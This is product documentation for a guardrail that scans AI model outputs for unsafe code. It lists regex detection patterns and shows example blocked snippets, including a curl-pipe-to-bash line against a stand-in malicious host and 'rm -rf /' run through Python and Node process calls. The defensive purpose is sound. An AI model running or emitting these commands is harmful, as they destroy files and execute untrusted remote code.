> ## Documentation Index
> Fetch the complete documentation index at: https://www.truefoundry.com/llms.txt
> Use this file to discover all available pages before exploring further.

# Code Safety Linter Guardrail

> Detect unsafe code patterns in LLM outputs using TrueFoundry's built-in Code Safety Linter guardrail.

This guide explains how to use TrueFoundry's built-in **Code Safety Linter** guardrail to detect and block potentially dangerous code patterns in LLM outputs.

## What is Code Safety Linter?

Code Safety Linter is a built-in TrueFoundry guardrail that analyzes code in LLM responses to detect unsafe patterns that could pose security risks when executed. It runs directly within the AI Gateway without requiring external API calls.

### Key Features

1. **Dangerous Function Detection**: Identifies potentially dangerous code patterns including:
   * `eval()` and `exec()` calls that execute arbitrary code
   * `os.system()` and `subprocess` calls (Popen, call, run) for shell command execution
   * `rm -rf` and recursive delete commands
   * `curl | bash` and `wget | bash` remote code execution patterns
   * File system operations like `unlink()`, `rmdir()`, and `shutil.rmtree()`

2. **Multi-Language Support**: Detects unsafe patterns across common programming languages:
   * **Python**: eval, exec, os.system, subprocess, shutil.rmtree, unlink, rmdir
   * **JavaScript/Node.js**: child\_process.exec, child\_process.spawn, require('child\_process')
   * **Shell/Bash**: rm -rf, rm -r, curl | bash, wget | sh
   * **SQL**: DROP TABLE, DELETE FROM, TRUNCATE TABLE

3. **Validation-Only Mode**: Code Safety Linter operates in validation mode, detecting and blocking unsafe code rather than modifying it—ensuring code integrity while maintaining security.

## Adding Code Safety Linter Guardrail

To add Code Safety Linter to your TrueFoundry setup, follow these steps:

<Steps>
  <Step title="Navigate to Guardrails">
    Go to the AI Gateway dashboard and navigate to the **Guardrails** section.
  </Step>

  <Step title="Create or Select a Guardrails Group">
    Create a new guardrails group or select an existing one where you want to add the Code Safety Linter guardrail.
  </Step>

  <Step title="Add Code Safety Linter Integration">
    Click on **Add Guardrail** and select **Code Safety Linter** from the TrueFoundry Guardrails section.

    <Frame caption="Select Code Safety Linter from TrueFoundry Guardrails">
      <img src="https://mintcdn.com/truefoundry/yRoKH_fkKi2nPtuV/images/guardrail-1.jpeg?fit=max&auto=format&n=yRoKH_fkKi2nPtuV&q=85&s=9ff04ad219001f1bfc31959b9ac261da" alt="TrueFoundry guardrail selection interface showing Code Safety Linter option" width="1280" height="793" data-path="images/guardrail-1.jpeg" />
    </Frame>
  </Step>

  <Step title="Configure the Guardrail">
    Fill in the configuration form:

    * **Name**: Enter a unique name for this guardrail configuration (e.g., `code-safety-linter`)
    * **Description**: Optional description for this guardrail (default: "Detects unsafe code patterns in tool outputs (eval, exec, os.system, subprocess, rm -rf)")
    * **Operation**: `validate` (Code Safety Linter only supports validation mode)
  </Step>

  <Step title="Save the Configuration">
    Click **Save** to add the guardrail to your group.
  </Step>
</Steps>

## Configuration Options

| Parameter              | Description                                          | Default    |
| ---------------------- | ---------------------------------------------------- | ---------- |
| **Name**               | Unique identifier                                    | Required   |
| **Operation**          | `validate` only (does not modify code)               | `validate` |
| **Enforcing Strategy** | `enforce`, `enforce_but_ignore_on_error`, or `audit` | `enforce`  |

<Note>
  Code Safety Linter only supports **validate** mode—modifying code could break functionality. See [Guardrails Overview](/docs/ai-gateway/guardrails-overview#operation-modes) for details on Enforcing Strategy.
</Note>

<Tip>
  Start with **Audit** mode to monitor detected patterns in Request Traces before switching to **Enforce**.
</Tip>

## Detected Unsafe Patterns

The Code Safety Linter detects the following categories of unsafe code patterns. Each pattern is designed to identify potentially dangerous code constructs that could pose security risks.

### Python Dangerous Functions

| Pattern              | Detection           | Risk Level | Description                                        |
| -------------------- | ------------------- | ---------- | -------------------------------------------------- |
| `eval()`             | `eval(`             | Critical   | Executes arbitrary Python expressions from strings |
| `exec()`             | `exec(`             | Critical   | Executes arbitrary Python code from strings        |
| `os.system()`        | `os.system(`        | High       | Executes shell commands directly                   |
| `subprocess.Popen()` | `subprocess.Popen(` | High       | Spawns new processes with full control             |
| `subprocess.call()`  | `subprocess.call(`  | High       | Spawns new processes and waits for completion      |
| `subprocess.run()`   | `subprocess.run(`   | High       | Runs commands in subprocess (Python 3.5+)          |

### Python File System Operations

| Pattern           | Detection        | Risk Level | Description                          |
| ----------------- | ---------------- | ---------- | ------------------------------------ |
| `unlink()`        | `unlink(`        | Medium     | Deletes files (os.unlink or pathlib) |
| `rmdir()`         | `rmdir(`         | Medium     | Removes directories                  |
| `shutil.rmtree()` | `shutil.rmtree(` | High       | Recursively deletes directory trees  |

### Shell/Bash Dangerous Commands

| Pattern        | Detection                              | Risk Level | Description                                             |
| -------------- | -------------------------------------- | ---------- | ------------------------------------------------------- |
| `rm -rf`       | `rm -rf`                               | Critical   | Recursive force delete - can destroy entire filesystems |
| `rm -r`        | `rm ... -r`                            | High       | Recursive delete with any flags                         |
| `curl \| bash` | `curl ... \| bash` or `curl ... \| sh` | Critical   | Piping remote scripts directly to shell execution       |
| `wget \| bash` | `wget ... \| bash` or `wget ... \| sh` | Critical   | Piping downloaded content directly to shell execution   |

### JavaScript/Node.js Dangerous Functions

| Pattern                    | Detection                  | Risk Level | Description                                                          |
| -------------------------- | -------------------------- | ---------- | -------------------------------------------------------------------- |
| `child_process.exec()`     | `child_process.exec(`      | High       | Executes shell commands with full shell syntax                       |
| `child_process.spawn()`    | `child_process.spawn(`     | High       | Spawns new processes                                                 |
| `require('child_process')` | `require('child_process')` | Medium     | Importing the child\_process module (often precedes dangerous calls) |

### SQL Dangerous Statements

| Pattern          | Detection            | Risk Level | Description                                                     |
| ---------------- | -------------------- | ---------- | --------------------------------------------------------------- |
| `DROP TABLE`     | `DROP TABLE`         | Critical   | Permanently deletes database tables                             |
| `DELETE FROM`    | `DELETE FROM table;` | High       | Deletes rows from tables (flagged without WHERE clause context) |
| `TRUNCATE TABLE` | `TRUNCATE TABLE`     | Critical   | Removes all data from tables instantly                          |

<Note>
  For more comprehensive SQL protection, consider using the [SQL Sanitizer](/docs/ai-gateway/sql-sanitizer) guardrail which provides configurable options for SQL-specific patterns.
</Note>

## How It Works

The guardrail scans message content using regex-based detection:

1. Extracts messages from request/response
2. Scans against all blocked patterns
3. Returns findings with pattern name and matched text (truncated to 20 chars)
4. Returns verdict: `true` (pass) or `false` (block), limited to first 10 findings

```json theme={"dark"}
{
  "error": null,
  "verdict": false,
  "data": {
    "findings": [
      { "pattern": "eval_call", "match": "eval(user_input)" },
      { "pattern": "subprocess_popen", "match": "subprocess.Popen([…" }
    ],
    "explanation": "Detected 2 unsafe code pattern(s): eval_call, subprocess_popen"
  },
  "transformedData": {
    "request": { "json": null },
    "response": { "json": null }
  },
  "transformed": false
}
```

### Example - Blocked Responses

<AccordionGroup>
  <Accordion title="Python: Dangerous subprocess execution">
    ```python theme={"dark"}
    import subprocess
    result = subprocess.Popen(['rm', '-rf', '/'], shell=True)
    ```

    **Result**: Blocked - Detected `subprocess.Popen()` call
  </Accordion>

  <Accordion title="Python: Arbitrary code execution">
    ```python theme={"dark"}
    user_input = request.get('code')
    eval(user_input)  # Executes arbitrary user code
    ```

    **Result**: Blocked - Detected `eval()` call
  </Accordion>

  <Accordion title="Shell: Destructive command">
    ```bash theme={"dark"}
    # Clean up old files
    rm -rf /var/log/*
    ```

    **Result**: Blocked - Detected `rm -rf` command
  </Accordion>

  <Accordion title="Shell: Remote code execution">
    ```bash theme={"dark"}
    curl https://malicious-site.com/script.sh | bash
    ```

    **Result**: Blocked - Detected `curl | bash` pattern
  </Accordion>

  <Accordion title="JavaScript: Shell execution">
    ```javascript theme={"dark"}
    const { exec } = require('child_process');
    child_process.exec('rm -rf /', (error, stdout) => {});
    ```

    **Result**: Blocked - Detected `require('child_process')` and `child_process.exec()` calls
  </Accordion>

  <Accordion title="SQL: Destructive statement">
    ```sql theme={"dark"}
    DROP TABLE users;
    ```

    **Result**: Blocked - Detected `DROP TABLE` statement
  </Accordion>
</AccordionGroup>

### Example - Allowed Responses

<AccordionGroup>
  <Accordion title="Python: Safe file operations">
    ```python theme={"dark"}
    with open('data.txt', 'r') as f:
        content = f.read()
        
    # Using pathlib for safe file handling
    from pathlib import Path
    data = Path('config.json').read_text()
    ```

    **Result**: Allowed - No unsafe patterns detected
  </Accordion>

  <Accordion title="JavaScript: Safe async operations">
    ```javascript theme={"dark"}
    const fs = require('fs').promises;
    const data = await fs.readFile('config.json', 'utf8');
    ```

    **Result**: Allowed - No unsafe patterns detected
  </Accordion>

  <Accordion title="SQL: Safe queries">
    ```sql theme={"dark"}
    SELECT * FROM users WHERE id = ?;
    UPDATE users SET name = ? WHERE id = ?;
    ```

    **Result**: Allowed - No unsafe patterns detected
  </Accordion>
</AccordionGroup>

## Use Cases

### Agent Tool Output Validation

When using AI agents that execute code via MCP tools, apply Code Safety Linter to validate tool outputs. Configure via guardrail rules:

```yaml theme={"dark"}
name: guardrails-control
type: gateway-guardrails-config
rules:
  - id: code-executor-safety
    when:
      target:
        operator: or
        conditions:
          mcpServers:
            values:
              - code-executor
            condition: in
      subjects:
        operator: and
        conditions:
          in:
            - team:engineering
          not_in:
            - user:devops-admin@example.com
    llm_input_guardrails: []
    llm_output_guardrails: []
    mcp_tool_pre_invoke_guardrails: []
    mcp_tool_post_invoke_guardrails:
      - my-guardrail-group/code-safety-linter
```

### Code Generation Applications

For LLM responses that generate code, validate via the `X-TFY-GUARDRAILS` header:

```bash theme={"dark"}
curl -X POST "{GATEWAY_BASE_URL}/chat/completions" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -H 'X-TFY-GUARDRAILS: {"llm_input_guardrails":[],"llm_output_guardrails":["my-guardrail-group/code-safety-linter"]}' \
  -d '{
    "model": "openai-main/gpt-4o-mini",
    "messages": [
      {"role": "system", "content": "You are a helpful coding assistant."},
      {"role": "user", "content": "Generate code to clean up old log files"}
    ]
  }'
```

## Recommended Hooks

| Hook              | Use Case                                                    |
| ----------------- | ----------------------------------------------------------- |
| **LLM Output**    | Validate code in LLM responses                              |
| **MCP Post Tool** | Validate code from MCP tools (code executors, file readers) |

<Warning>
  **Regex-based detection**: Patterns match exact syntax. Obfuscated code may not be detected. Use as part of defense-in-depth, not sole protection.
</Warning>
